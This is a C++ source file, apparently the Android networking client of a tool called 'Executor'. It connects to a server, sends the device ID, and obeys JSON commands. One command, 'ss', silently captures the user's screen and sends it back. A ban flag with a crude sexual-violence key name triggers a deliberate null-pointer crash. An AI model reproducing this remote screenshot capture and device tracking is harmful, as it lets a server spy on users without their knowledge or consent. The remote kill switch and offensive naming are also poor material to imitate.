#include "ClientNetwork.h"
#include "ClientNetworkSender.h"
#include "Heplers/JniHelper.h"
#include "Includes/json.hpp"
#include "BGFX/Logger.h"
#include <unistd.h>
#include <arpa/inet.h>
#include <iostream>
#include <sstream>

using json = nlohmann::json;

ClientNetwork* ClientNetwork::instance = nullptr;

ClientNetwork::ClientNetwork() : sockfd(-1), running(false) {
    BGFX_LOG_INFO("Initializing ClientNetwork");
    sender = new ClientNetworkSender();
}

ClientNetwork::~ClientNetwork() {
    BGFX_LOG_INFO("Destroying ClientNetwork");
    disconnect();
    delete sender;
}

ClientNetwork* ClientNetwork::Instance() {
    if (!instance) {
        BGFX_LOG_INFO("Creating new ClientNetwork instance");
        instance = new ClientNetwork();
    }
    return instance;
}

ClientNetworkSender* ClientNetwork::getSender() {
    return sender;
}

void ClientNetwork::connectToServer(const std::string& ip, int port) {
    if (running.load()) {
        BGFX_LOG_INFO("Already connected to server");
        return;
    }

    BGFX_LOG_INFO("Connecting to server at %s:%d", ip.c_str(), port);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        BGFX_LOG_ERROR("Socket creation failed: %s", strerror(errno));
        return;
    }

    sockaddr_in serv_addr{};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip.c_str(), &serv_addr.sin_addr) <= 0) {
        BGFX_LOG_ERROR("Invalid address: %s", ip.c_str());
        close(sockfd);
        return;
    }

    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        BGFX_LOG_ERROR("Connection to %s:%d failed: %s", ip.c_str(), port, strerror(errno));
        close(sockfd);
        return;
    }

    BGFX_LOG_INFO("Successfully connected to server");
    this->sendDeviceId();

    running.store(true);
    listenerThread = std::thread(&ClientNetwork::listenLoop, this);
}

void ClientNetwork::disconnect() {
    if (!running.load()) return;

    BGFX_LOG_INFO("Disconnecting from server");

    running.store(false);
    if (listenerThread.joinable()) listenerThread.join();
    if (sockfd >= 0) {
        close(sockfd);
        BGFX_LOG_INFO("Socket closed");
    }
    sockfd = -1;
}

bool ClientNetwork::isConnected() const {
    return running.load();
}

void ClientNetwork::listenLoop() {
    BGFX_LOG_INFO("Started listening to server");

    char buffer[4096];
    while (running.load()) {
        ssize_t bytesReceived = recv(sockfd, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) {
            BGFX_LOG_ERROR("Disconnected from server or recv failed: %s", strerror(errno));
            break;
        }

        buffer[bytesReceived] = '\0';
        std::string message(buffer);

        BGFX_LOG_DEBUG("Received message: %s", message.c_str());

        try {
            json j = json::parse(message);
            std::string jsonPayload = j.dump(4);
            BGFX_LOG_DEBUG(jsonPayload.c_str());
            

            if (j.contains("cmd")) {
                std::string cmd = j["cmd"];
                BGFX_LOG_INFO("Received command: %s", cmd.c_str());

                if (cmd == "ss") {
                    std::string screenshotData = JniHelper::getScreenshot();
                    BGFX_LOG_DEBUG("Sending screenshot data of size: %zu", screenshotData.size());
                    ClientNetworkSender::send(sockfd, screenshotData);
                }
                if (cmd == "f") {
                    std::string data = j["data"];
                    JniHelper::showToast(data.c_str());
                }
                if (cmd == "xb") {
                    std::string content = j["data"];
                    if (j.contains("xbt")) {
                        std::string title = j["xbt"];
                        JniHelper::showDialog(title.c_str(), content.c_str());
                    } else {
                        JniHelper::showDialog(content.c_str());
                    }
                }
                
                
                
                
            }
            if (j.contains("isRaped")) {
                bool status = j["isRaped"];
                BGFX_LOG_INFO("Received ban status: %s", std::to_string(status).c_str());
                if (status) {
                    JniHelper::showToast("You have been suspended from using Executor.");
                    JniHelper::showDialog("You have been suspended from using Executor.");
                    char* p = nullptr;
	                p[0] = 'c';
                }
            }
        } catch (const std::exception& e) {
            BGFX_LOG_ERROR("JSON parse error: %s", e.what());
        }
    }

    running.store(false);
    if (sockfd >= 0) {
        close(sockfd);
        BGFX_LOG_INFO("Socket closed after listen loop");
        sockfd = -1;
    }

    BGFX_LOG_INFO("Stopped listening to server");
}

void ClientNetwork::sendScreenshotTest() {
    std::string screenshotData = JniHelper::getScreenshot();
    BGFX_LOG_DEBUG("Sending screenshot data of size: %zu", screenshotData.size());
    ClientNetworkSender::send(sockfd, screenshotData);
}

void ClientNetwork::sendDeviceId() {
    json payload = {
        {"deviceId", JniHelper::getDeviceId()}
    };
    std::string data = payload.dump();
    ClientNetworkSender::send(sockfd, data);
}
